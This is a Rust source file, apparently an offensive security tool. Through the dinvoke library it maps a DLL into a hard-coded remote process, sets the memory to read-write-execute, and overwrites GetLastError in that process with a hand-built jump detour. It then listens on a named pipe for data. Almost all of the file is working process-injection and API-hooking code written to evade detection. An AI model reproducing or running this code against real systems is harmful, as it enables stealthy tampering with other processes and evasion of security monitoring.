use std::ops::Add;
use std::{collections::HashMap, path::Path};
use std::{fs, ptr};
use std::mem::size_of;
use std::ffi::c_void;
use bindings::Windows::Win32::System::SystemServices::OVERLAPPED;
use winapi::shared::ntdef::LARGE_INTEGER;

use bindings::{
    Windows::Win32::System::Diagnostics::Debug::{IMAGE_OPTIONAL_HEADER32,IMAGE_SECTION_HEADER},
    Windows::Win32::System::Threading::GetCurrentProcess,
    Windows::Win32::System::SystemServices::{IMAGE_BASE_RELOCATION,IMAGE_IMPORT_DESCRIPTOR,IMAGE_THUNK_DATA32,IMAGE_THUNK_DATA64},
    Windows::Win32::System::Kernel::UNICODE_STRING,
    Windows::Win32::Foundation::HANDLE,
    Windows::Win32::System::WindowsProgramming::{OBJECT_ATTRIBUTES, IO_STATUS_BLOCK},
};

use data::{IMAGE_FILE_HEADER, IMAGE_OPTIONAL_HEADER64, MEM_COMMIT, MEM_RESERVE, 
    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PVOID, PeMetadata, SECTION_MEM_EXECUTE, 
    SECTION_MEM_READ, SECTION_MEM_WRITE, FILE_EXECUTE, FILE_READ_ATTRIBUTES, SYNCHRONIZE, FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_DELETE, 
    FILE_SYNCHRONOUS_IO_NONALERT, FILE_NON_DIRECTORY_FILE, SECTION_ALL_ACCESS, SEC_IMAGE, PeManualMap, CreateTransaction, CreateFileTransactedA, PioApcRoutine, NtWriteFile, CreateNamedPipeW, CloseHandle, GetLastError};



fn main() {
    
    unsafe 
    {

        let pid = 4604 as u32;
        let obj = overload::map_to_section("prueba2.dll", pid).unwrap();

        
        let ntdll = dinvoke::get_module_base_address("ntdll.dll");
        let kernel32 = dinvoke::get_module_base_address("kernel32.dll");

        let addr1 = dinvoke::get_function_address(kernel32, "GetLastError") as *mut u8;
        let addr2 = dinvoke::get_function_address(ntdll, "NtCancelTimer") as *mut u8;
        let mut c1: [u8; 13] = [0; 13];
        let mut c2: [u8; 13] = [0; 13];

        for i in 0..12
        {
            c1[i] = *(addr1.add(i));
            c2[i] = *(addr2.add(i));
        }

        let mut pipe_name: Vec<u16> = "\\\\.\\pipe\\test111".to_string().encode_utf16().collect();
        pipe_name.push(0);
        let f: CreateNamedPipeW;
        let r: Option<HANDLE>;
        dinvoke::dynamic_invoke!(
            kernel32,
            "CreateNamedPipeW",
            f,
            r,
            pipe_name.as_ptr() as *mut u16,
            0x00000003, //PIPE_ACCESS_DUPLEX
            0x00000000, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT
            2,
            1024 * 16,
            1024 * 16,
            0x00000000, //NMPWAIT_USE_DEFAULT_WAIT
            ptr::null()
        );

        let mut pipe_handle = HANDLE::default();
        match r
        {
            Some(x)=> pipe_handle = x,
            None => println!("dep")
        }

        let detour_funct_address = dinvoke::get_function_address(obj.0.base_address, "get_addr1");
        let offset = detour_funct_address - obj.0.base_address;
        let detour_address = (obj.1.base_address + offset) as usize;
        
        println!("La seccion esta en 0x{:X}", obj.1.base_address as i64);
        println!("La funcion esta en 0x{:X}", detour_address as i64);

        let handle = dinvoke::open_process(0x0008|0x0020, 0, pid);

        let base_address_1: *mut c_void = std::mem::transmute(addr1);
        let mut buffer: Vec<u8> = vec![0u8; 14];
        let buffer_ptr: *mut u8 = buffer.as_mut_ptr();
        *buffer_ptr = 0x49;
        *(buffer_ptr.add(1)) =  0xBB;
        *(buffer_ptr.add(2) as *mut usize) = detour_funct_address as usize; 
        *(buffer_ptr.add(10)) = 0x41;
        *(buffer_ptr.add(11)) = 0xFF;
        *(buffer_ptr.add(12)) = 0xE3;

        let final_buffer: *mut c_void = std::mem::transmute(buffer_ptr);
        
        
        let size = 14usize;
        let size_ptr: *mut usize = std::mem::transmute(&size);
        let ba: *mut PVOID = std::mem::transmute(&base_address_1);
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
        let r = dinvoke::nt_protect_virtual_memory(
            handle, 
            ba, 
            size_ptr, 
            PAGE_EXECUTE_READWRITE, 
            old_protection);
        
        if r != 0
        {
            println!("Algo fue mal cambiando proteciones: {:x}", r);
        }

        let base_address_2: *mut c_void = std::mem::transmute(addr1);
        let written: u64 = 0;
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let size = 13usize;
        let r = dinvoke::nt_write_virtual_memory(
            handle, 
            base_address_2, 
            final_buffer, 
            size, 
            bytes_written
        );

        if r != 0 || *bytes_written != 13
        {
            println!("Algo fue mal escribiendo: {:x}", r);
            println!("escrito: {}", *bytes_written);
        }


        loop {

            let over: Vec<u8> = vec![0u8; size_of::<OVERLAPPED>()];
            let over: *mut OVERLAPPED = std::mem::transmute(over.as_ptr());
            if dinvoke::connect_named_pipe(pipe_handle, over)
            {
                let mut buff: Vec<u8> = vec![0;14];
                let buffer_ptr: PVOID = std::mem::transmute(buff.as_mut_ptr());
                let bytes_to_read = 1024;
                let bytes_read: *mut u32 = std::mem::transmute(&u32::default());
                let over: Vec<u8> = vec![0u8; size_of::<OVERLAPPED>()];
                let over: *mut OVERLAPPED = std::mem::transmute(over.as_ptr());
                while dinvoke::read_file(pipe_handle, buffer_ptr, bytes_to_read, bytes_read, over)
                {
                    let l = *bytes_read as usize;
                    println!("bytes leidos: {}", l);               
                    println!("len: {}", buff.len());
                    println!("{}", buff[0] as char);
                    println!("{}", buff[3] as char);

                    let mut buff: Vec<u8> = vec![0;14];
                    let buffer_ptr: PVOID = std::mem::transmute(buff.as_mut_ptr());
                    let bytes_to_read = 1024;
                    let bytes_read: *mut u32 = std::mem::transmute(&u32::default());
                    let over: Vec<u8> = vec![0u8; size_of::<OVERLAPPED>()];
                    let over: *mut OVERLAPPED = std::mem::transmute(over.as_ptr());

                }

                let f: GetLastError;
                let r: Option<u32>;
                dinvoke::dynamic_invoke!(
                    kernel32,
                    "GetLastError",
                    f,
                    r,
                );

                println!("{}", r.unwrap());
            }

            dinvoke::disconnect_named_pipe(pipe_handle);
        }
    }
 
}